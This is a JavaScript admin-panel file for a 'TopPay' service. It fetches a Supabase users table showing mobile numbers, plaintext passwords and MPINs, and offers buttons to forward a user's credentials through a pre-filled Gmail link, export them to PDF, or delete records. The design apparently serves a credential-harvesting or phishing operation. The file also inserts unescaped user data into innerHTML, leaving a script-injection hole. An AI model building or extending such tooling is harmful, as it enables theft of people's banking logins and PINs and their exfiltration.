import { supabase } from "../../user-app/js/config/supabase.js";
import { logActivity } from "./auth.js";

document.addEventListener("DOMContentLoaded", () => {
  const usersTableBody = document.getElementById("usersTableBody");
  const refreshUsersBtn = document.getElementById("refreshUsers");
  const searchUsersInput = document.getElementById("searchUsersInput");
  const filterUsersSelect = document.getElementById("filterUsersSelect");

  let allUsersList = [];

  function renderUsers(usersToRender) {
    usersTableBody.innerHTML = "";

    if (!usersToRender || usersToRender.length === 0) {
      usersTableBody.innerHTML =
        '<tr><td colspan="7" style="text-align:center;">No users found</td></tr>';
      return;
    }

    usersToRender.forEach((user) => {
      const date = user.created_at
        ? new Date(user.created_at).toLocaleString()
        : "N/A";
      const statusClass =
        user.status === "completed" ? "status-completed" : "status-pending";

      const tr = document.createElement("tr");
      tr.innerHTML = `
                    <td><input type="checkbox" class="user-checkbox" value="${user.id}"></td>
                    <td><code style="background:#f3f4f6;padding:2px 6px;border-radius:4px;font-size:11px;">${user.id}</code></td>
                    <td>${user.mobile || "N/A"}</td>
                    <td>${user.password || "N/A"}</td>
                    <td>${user.mpin || "Not Set"}</td>
                    <td>${user.login_count || 0}</td>
                    <td><span class="status-badge ${statusClass}">${user.status || "pending"}</span></td>
                    <td style="color:#666; font-size:12px;">${date}</td>
                    <td><button class="view-user-btn" data-user='${JSON.stringify(user).replace(/'/g, "&apos;")}' style="background:#3b82f6; color:white; border:none; padding:4px 8px; border-radius:4px; cursor:pointer; font-size:12px;">View</button></td>
                `;
      usersTableBody.appendChild(tr);
    });

    document.querySelectorAll(".view-user-btn").forEach((btn) => {
      btn.addEventListener("click", (e) => {
        const userStr = e.currentTarget.getAttribute("data-user");
        const user = JSON.parse(userStr);
        openUserDetails(user);
      });
    });
  }

  function applyFilters() {
    const query = searchUsersInput.value.trim().toLowerCase();
    const filter = filterUsersSelect.value;

    let filtered = allUsersList;
    if (query) {
      filtered = filtered.filter(
        (u) => u.mobile && u.mobile.toLowerCase().includes(query),
      );
    }
    if (filter !== "all") {
      filtered = filtered.filter(
        (u) => u.status === filter || (!u.status && filter === "pending"),
      );
    }
    renderUsers(filtered);
  }

  async function fetchUsers() {
    try {
      const { data: users, error } = await supabase
        .from("users")
        .select("*")
        .order("created_at", { ascending: false });

      if (error) {
        console.error("Fetch users error:", error);
        return;
      }

      allUsersList = users || [];
      applyFilters();
    } catch (e) {
      console.error(e);
    }
  }

  // Handle Select All Checkbox
  const selectAllCheckbox = document.getElementById("selectAllUsers");
  if (selectAllCheckbox) {
    selectAllCheckbox.addEventListener("change", (e) => {
      const checkboxes = document.querySelectorAll(".user-checkbox");
      checkboxes.forEach((cb) => (cb.checked = e.target.checked));
    });
  }

  // Helper to get selected users
  function getSelectedUsers() {
    const checkboxes = document.querySelectorAll(".user-checkbox:checked");
    const selectedIds = Array.from(checkboxes).map((cb) => cb.value);
    return allUsersList.filter((u) => selectedIds.includes(u.id));
  }

  searchUsersInput.addEventListener("input", applyFilters);
  filterUsersSelect.addEventListener("change", applyFilters);

  let currentUser = null;
  const userDetailsModal = document.getElementById("userDetailsModal");
  const userDetailsContent = document.getElementById("userDetailsContent");

  function openUserDetails(user) {
    currentUser = user;
    userDetailsModal.classList.remove("hidden");
    userDetailsModal.style.display = "flex";
    userDetailsContent.innerHTML = `
        <strong>User ID:</strong> <code style="background:#f3f4f6;padding:2px 6px;border-radius:4px;font-size:12px;">${user.id}</code> <br/>
        <strong>Mobile:</strong> ${user.mobile} <br/>
        <strong>Password:</strong> ${user.password} <br/>
        <strong>MPIN:</strong> ${user.mpin || "Not Set"} <br/>
        <strong>Logins:</strong> ${user.login_count || 0} <br/>
        <strong>Status:</strong> ${user.status} <br/>
        <strong>Created At:</strong> ${user.created_at ? new Date(user.created_at).toLocaleString() : "N/A"} <br/>
        <strong>Last Login:</strong> ${user.last_login ? new Date(user.last_login).toLocaleString() : "N/A"}
      `;
    // Re-render lucide icons for modal
    if (window.lucide) lucide.createIcons();
  }

  document
    .getElementById("closeUserDetailsBtn")
    .addEventListener("click", () => {
      userDetailsModal.classList.add("hidden");
      userDetailsModal.style.display = "none";
      currentUser = null;
    });

  document.getElementById("gmailForwardBtn").addEventListener("click", () => {
    if (!currentUser) return;
    const subject = encodeURIComponent("TopPay User Details");
    const body = encodeURIComponent(
      `Mobile Number: ${currentUser.mobile}\nPassword: ${currentUser.password}\nMPIN: ${currentUser.mpin || "Not Set"}\nStatus: ${currentUser.status}\nLogin Count: ${currentUser.login_count || 0}\nDate: ${currentUser.created_at ? new Date(currentUser.created_at).toLocaleString() : "N/A"}\nLast Login: ${currentUser.last_login ? new Date(currentUser.last_login).toLocaleString() : "N/A"}`,
    );
    window.open(
      `https://mail.google.com/mail/?view=cm&fs=1&su=${subject}&body=${body}`,
      "_blank",
    );
  });

  document.getElementById("downloadPdfBtn").addEventListener("click", () => {
    if (!currentUser) return;
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF();
    doc.setFontSize(16);
    doc.text("TopPay User Details", 10, 20);
    doc.setFontSize(12);
    doc.text(`Mobile: ${currentUser.mobile}`, 10, 30);
    doc.text(`Password: ${currentUser.password}`, 10, 40);
    doc.text(`MPIN: ${currentUser.mpin || "Not Set"}`, 10, 50);
    doc.text(`Status: ${currentUser.status}`, 10, 60);
    doc.text(`Login Count: ${currentUser.login_count || 0}`, 10, 70);
    doc.text(
      `Created: ${currentUser.created_at ? new Date(currentUser.created_at).toLocaleString() : "N/A"}`,
      10,
      80,
    );
    doc.text(
      `Last Login: ${currentUser.last_login ? new Date(currentUser.last_login).toLocaleString() : "N/A"}`,
      10,
      90,
    );
    doc.save(`User_${currentUser.mobile}.pdf`);
  });

  document
    .getElementById("deleteUserBtn")
    .addEventListener("click", async (e) => {
      if (!currentUser) return;
      
      const button = e.currentTarget;
      if (button.textContent === "Delete") {
        button.textContent = "Click to Confirm";
        button.style.background = "#b91c1c";
        setTimeout(() => {
          if (button && button.textContent === "Click to Confirm") {
            button.textContent = "Delete";
            button.style.background = "";
          }
        }, 3000);
        return;
      }
      
      button.textContent = "Deleting...";
      button.disabled = true;

      const { error: trashErr } = await supabase.from("trash").insert({
        original_table: "users",
        record_id: currentUser.id,
        record_data: currentUser,
      });

      if (trashErr) {
        console.error("Error inserting to trash:", trashErr);
        alert("Error moving user to trash: " + trashErr.message);
        button.textContent = "Delete";
        button.disabled = false;
        button.style.background = "";
        return;
      }

      const { error: delErr } = await supabase
        .from("users")
        .delete()
        .eq("id", currentUser.id);

      if (delErr) {
        console.error("Error deleting from users:", delErr);
        alert("Error deleting user: " + delErr.message);
        button.textContent = "Delete";
        button.disabled = false;
        button.style.background = "";
        return;
      }

      userDetailsModal.classList.add("hidden");
      userDetailsModal.style.display = "none";
      fetchUsers();
      logActivity(
        "User Deleted",
        `Moved user ${currentUser.mobile} to trash`,
      );
      
      // Reset button state
      button.textContent = "Delete";
      button.disabled = false;
      button.style.background = "";
    });

  const deleteAllUsersBtn = document.getElementById("deleteAllUsersBtn");
  if (deleteAllUsersBtn) {
    deleteAllUsersBtn.textContent = "Delete Selected";
    deleteAllUsersBtn.addEventListener("click", async (e) => {
      const selectedUsers = getSelectedUsers();
      if (selectedUsers.length === 0) {
        alert("Please select at least one user to delete.");
        return;
      }

      const button = e.currentTarget;
      if (button.textContent === "Delete Selected") {
        button.textContent = `Confirm Delete (${selectedUsers.length})`;
        button.style.background = "#b91c1c";
        setTimeout(() => {
          if (button && button.textContent.startsWith("Confirm Delete")) {
            button.textContent = "Delete Selected";
            button.style.background = "";
          }
        }, 3000);
        return;
      }

      button.disabled = true;
      button.textContent = "Processing...";

      try {
        if (selectedUsers.length > 0) {
          for (const user of selectedUsers) {
            await supabase.from("trash").insert({
              original_table: "users",
              record_id: user.id,
              record_data: user,
            });
            await supabase.from("users").delete().eq("id", user.id);
          }
          logActivity(
            "All Users Deleted",
            `Moved ${allUsers.length} users to trash`,
          );
        } else {
          alert("No users to delete.");
        }
      } catch (e) {
        console.error(e);
        alert("Error deleting all users.");
      } finally {
        button.disabled = false;
        button.textContent = "Delete All";
        button.style.background = "";
        fetchUsers();
      }
    });
  }

  const downloadAllPdfBtn = document.getElementById("downloadAllPdfBtn");
  if (downloadAllPdfBtn) {
    downloadAllPdfBtn.textContent = "Download Selected PDF";
    downloadAllPdfBtn.addEventListener("click", () => {
      const selectedUsers = getSelectedUsers();
      if (selectedUsers.length === 0) {
        alert("Please select at least one user to download.");
        return;
      }

      const { jsPDF } = window.jspdf;
      const doc = new jsPDF();
      doc.setFontSize(16);
      doc.text("TopPay Selected Users", 10, 20);
      doc.setFontSize(10);
      doc.text(`Generated: ${new Date().toLocaleString()}`, 10, 28);
      
      let y = 40;
      doc.text("Mobile", 10, y);
      doc.text("Password", 45, y);
      doc.text("MPIN", 85, y);
      doc.text("Status", 110, y);
      doc.text("Logins", 140, y);
      doc.text("Date", 160, y);
      y += 6;

      selectedUsers.forEach(user => {
        if (y > 280) { doc.addPage(); y = 20; }
        doc.text(user.mobile || "N/A", 10, y);
        doc.text(user.password || "N/A", 45, y);
        doc.text(user.mpin || "-", 85, y);
        doc.text(user.status || "pending", 110, y);
        doc.text(String(user.login_count || 0), 140, y);
        doc.text(user.created_at ? new Date(user.created_at).toLocaleDateString() : "-", 160, y);
        y += 6;
      });

      doc.save(`Selected_Users_${new Date().toISOString().split("T")[0]}.pdf`);
      logActivity("Downloaded Selected Users PDF", `Admin downloaded PDF of ${selectedUsers.length} users`);
    });
  }

  refreshUsersBtn.addEventListener("click", fetchUsers);

  // Supabase Realtime - Live updates for users table
  const channel = supabase
    .channel("users-realtime")
    .on(
      "postgres_changes",
      { event: "*", schema: "public", table: "users" },
      (payload) => {
        console.log("Realtime user change:", payload.eventType);
        fetchUsers();
      }
    )
    .subscribe();

  // Fallback polling every 10 seconds
  setInterval(fetchUsers, 10000);

  // Initial fetch


  fetchUsers();
});
